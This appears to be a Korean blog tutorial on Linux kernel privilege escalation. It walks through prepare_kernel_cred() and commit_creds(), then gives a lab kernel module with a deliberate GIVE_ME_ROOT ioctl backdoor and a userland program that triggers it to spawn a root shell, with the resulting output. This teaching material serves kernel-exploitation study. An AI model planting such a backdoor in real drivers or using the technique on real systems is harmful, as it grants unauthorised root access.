---
title: Privilege Escalation
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, privilege escalation]
math: true
mermaid: true
---

## Description 

`prepare_kernel_cres()`, `commit_creds()` 함수를 통해 root 권한을 획득할 수 있다.

## prepare_kernel_cred()

```c
// kernel/cred.c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
    const struct cred *old;
    struct cred *new;
 
    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);  // new 변수에 객체 할당
    if (!new)
        return NULL;
 
    kdebug("prepare_kernel_cred() alloc %p", new);
 
    if (daemon) 
        old = get_task_cred(daemon);  // 전달된 프로세스의 credentials을 old 변수에 저장
    else
        old = get_cred(&init_cred);  // init_cred의 credentials을 old 변수에 저장
 
    validate_creds(old);  // 전달된 credentials(old)의 유효성을 검사
 
    *new = *old;
    atomic_set(&new->usage, 1);  // "&new->usage" 영역에 1이 설정됨
    set_cred_subscribers(new, 0);  // "&cred->suvscribers" 영역에 0이 설정됨
    get_uid(new->user);  // new credentials의 uid user name
    get_user_ns(new->user_ns);  // new credentials의 user namespace
    get_group_info(new->group_info);  // new credentials의 group_info 
 
#ifdef CONFIG_KEYS
    new->session_keyring = NULL;
    new->process_keyring = NULL;
    new->thread_keyring = NULL;
    new->request_key_auth = NULL;
    new->jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;
#endif
 
#ifdef CONFIG_SECURITY
    new->security = NULL;
#endif
    if (security_prepare_creds(new, old, GFP_KERNEL) < 0)  // security_prepare_creds() 함수를 통해 현재 프로세스의 credentials을 변경
        goto error;
 
    put_cred(old);  // 현재 프로세스가 이전에 참조한 credentials 해제
    validate_creds(new);  // credentials(new)의 유효성 검사
    return new;
 
error:
    put_cred(new);
    put_cred(old);
    return NULL;
}
EXPORT_SYMBOL(prepare_kernel_cred);
```

```c
// kernel/cred.c
struct cred init_cred = {
    .usage          = ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
    .subscribers        = ATOMIC_INIT(2),
    .magic          = CRED_MAGIC,
#endif
    .uid            = GLOBAL_ROOT_UID,
    .gid            = GLOBAL_ROOT_GID,
    .suid           = GLOBAL_ROOT_UID,
    .sgid           = GLOBAL_ROOT_GID,
    .euid           = GLOBAL_ROOT_UID,
    .egid           = GLOBAL_ROOT_GID,
    .fsuid          = GLOBAL_ROOT_UID,
    .fsgid          = GLOBAL_ROOT_GID,
    .securebits     = SECUREBITS_DEFAULT,
    .cap_inheritable    = CAP_EMPTY_SET,
    .cap_permitted      = CAP_FULL_SET,
    .cap_effective      = CAP_FULL_SET,
    .cap_bset       = CAP_FULL_SET,
    .user           = INIT_USER,
    .user_ns        = &init_user_ns,
    .group_info     = &init_groups,
};
```

```c
// include/linux/uidgid.h
#define GLOBAL_ROOT_UID KUIDT_INIT(0)
#define GLOBAL_ROOT_GID KGIDT_INIT(0)
...
typedef struct {
    uid_t val;
} kuid_t;
 
 
typedef struct {
    gid_t val;
} kgid_t;
 
#define KUIDT_INIT(value) (kuid_t){ value }
#define KGIDT_INIT(value) (kgid_t){ value }
```

## commit_creds()

```c
// kernel/cred.c
int commit_creds(struct cred *new)
{
    struct task_struct *task = current;  // current가 가지고 있는 현재 프로세스의 정보를 task에 저장
    const struct cred *old = task->real_cred;  // task 구조체를 이용해 현재 프로세스가 사용중인 credential을 old 변수에 저장
 
    kdebug("commit_creds(%p %d,%d)", new,
           atomic_read(&new->usage),
           read_cred_subscribers(new));
 
    BUG_ON(task->cred != old);
#ifdef CONFIG_DEBUG_CREDENTIALS
    BUG_ON(read_cred_subscribers(old) < 2);
    validate_creds(old);
    validate_creds(new);
#endif
    BUG_ON(atomic_read(&new->usage) < 1);  // "task->cred"과 "old"의 credentials이 다른지 확인, "&new->usage"에 저장된 값이 1보다 작은지 확인
 
    get_cred(new);  // new 변수에 저장된 credentials에 참조될 정보를 가져옴 /* we will require a ref for the subj creds too */ 
 
    /* dumpability changes */
    if (!uid_eq(old->euid, new->euid) ||  // uid_eq(), gid_eq() 함수를 이용해 구조체 내 저장된 변수의 값을 확인
        !gid_eq(old->egid, new->egid) ||  
        !uid_eq(old->fsuid, new->fsuid) ||
        !gid_eq(old->fsgid, new->fsgid) ||
        !cred_cap_issubset(old, new)) { // 두 credentials가 동일한 userspace에 있는지 확인
        if (task->mm)
            set_dumpable(task->mm, suid_dumpable);
        task->pdeath_signal = 0;
        smp_wmb();
    }
 
    /* alter the thread keyring */
    if (!uid_eq(new->fsuid, old->fsuid))  // uid_eq(), gid_eq() 함수를 이용해 구조체 내 저장된 변수의 값을 확인
        key_fsuid_changed(task);   // 비교값이 다를 경우 key_fsuid_changed() 함수를 이용하여 현재 프로세스의 fsuid, fsgid로 값을 갱신
    if (!gid_eq(new->fsgid, old->fsgid)) 
        key_fsgid_changed(task);
 
    /* do it
     * RLIMIT_NPROC limits on user->processes have already been checked
     * in set_user().
     */
    alter_cred_subscribers(new, 2); // new 구조체에서 subscribers 변수에 2를 더함
    if (new->user != old->user)
        atomic_inc(&new->user->processes);
    rcu_assign_pointer(task->real_cred, new); // 현재 프로세스의 "task->real_cred", "task_cred" 영역에 새로운 credentials 등록
    rcu_assign_pointer(task->cred, new);
    if (new->user != old->user)
        atomic_dec(&old->user->processes);
    alter_cred_subscribers(old, -2);  // old 구조체에서 subscribers 변수에 -2를 더함
 
    /* send notifications */
    if (!uid_eq(new->uid,   old->uid)  ||
        !uid_eq(new->euid,  old->euid) ||
        !uid_eq(new->suid,  old->suid) ||
        !uid_eq(new->fsuid, old->fsuid))
        proc_id_connector(task, PROC_EVENT_UID);
 
    if (!gid_eq(new->gid,   old->gid)  ||
        !gid_eq(new->egid,  old->egid) ||
        !gid_eq(new->sgid,  old->sgid) ||
        !gid_eq(new->fsgid, old->fsgid))
        proc_id_connector(task, PROC_EVENT_GID);
 
    /* release the old obj and subj refs both */
    put_cred(old); // 이전에 사용된 credentials 모두 해제
    put_cred(old);
    return 0;
}
EXPORT_SYMBOL(commit_creds);
```

## Example

```c
// escalation.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
   
#include "escalation.h"
MODULE_LICENSE("Dual BSD/GPL");
   
#define DRIVER_NAME "chardev"
       
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 1;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
  
static int     chardev_open(struct inode *, struct file *);
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static long chardev_ioctl(struct file *, unsigned int, unsigned long);
  
struct file_operations s_chardev_fops = {
    .open    = chardev_open,
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .unlocked_ioctl = chardev_ioctl,
};
  
static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    int minor = 0;
    dev_t dev;
   
    printk("The chardev_init() function has been called.");
       
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
   
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &s_chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
   
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
   
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
   
    device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, "chardev%d", minor);
    return 0;
}
   
static void chardev_exit(void)
{
    int minor = 0;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
       
    printk("The chardev_exit() function has been called.");
  
    device_destroy(chardev_class, MKDEV(chardev_major, minor));
   
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}
  
static int chardev_open(struct inode *inode, struct file *file)
{
    printk("The chardev_open() function has been called.");
    return 0;
}
   
static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_close() function has been called.");
    return 0;
}
   
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_write() function has been called."); 
    return count;
}
   
static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_read() function has been called.");
    return count;
}
   
static struct ioctl_info info;
static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    printk("The chardev_ioctl() function has been called.");
   
    switch (cmd) {
        case SET_DATA:
            printk("SET_DATA\n");
            if (copy_from_user(&info, (void __user *)arg, sizeof(info))) {
                return -EFAULT;
            }
        printk("info.size : %ld, info.buf : %s",info.size, info.buf);
            break;
        case GET_DATA:
            printk("GET_DATA\n");
            if (copy_to_user((void __user *)arg, &info, sizeof(info))) {
                return -EFAULT;
            }
            break;
        case GIVE_ME_ROOT:
            printk("GIVE_ME_ROOT\n");
            commit_creds(prepare_kernel_cred(NULL));
            return 0;
 
        default:
            printk(KERN_WARNING "unsupported command %d\n", cmd);
   
        return -EFAULT;
    }
    return 0;
}
  
module_init(chardev_init);
module_exit(chardev_exit);
```

```c
// escalation.h
#ifndef CHAR_DEV_H_
#define CHAR_DEV_H_
#include <linux/ioctl.h>
  
struct ioctl_info{
       unsigned long size;
       char buf[128];
};
   
#define             IOCTL_MAGIC         'G'
#define             SET_DATA            _IOW(IOCTL_MAGIC, 2 ,struct ioctl_info)
#define             GET_DATA            _IOR(IOCTL_MAGIC, 3 ,struct ioctl_info)
#define             GIVE_ME_ROOT        _IO(IOCTL_MAGIC, 0)
#endif
```

등록된 장치 디바이스를 오픈 후 `ioctl()` 함수를 통해 GIVE_ME_ROOT를 실행하는 코드를 작성한다.

```c
// test.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
 
#include "escalation.h"
 
void main()
{
    int fd, ret;
 
    fd = open("/dev/chardev0", O_NOCTTY);
    if (fd < 0) {
        printf("Can't open device file\n");
        exit(1);
    }
 
    ret = ioctl(fd, GIVE_ME_ROOT);
    if (ret < 0) {
        printf("ioctl failed: %d\n", ret);
        exit(1);
    }
    close(fd);
 
    execl("/bin/sh", "sh", NULL);
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop/programming$ ./test 
# id
# dmesg | tail
...
uid=0(root) gid=0(root) groups=0(root)
[22793.303825] The chardev_open() function has been called.
The chardev_ioctl() function has been called.
GIVE_ME_ROOT
```

## References
- [04.Creating a kernel module to privilege escalation](https://www.lazenca.net/display/TEC/04.Creating+a+kernel+module+to+privilege+escalation)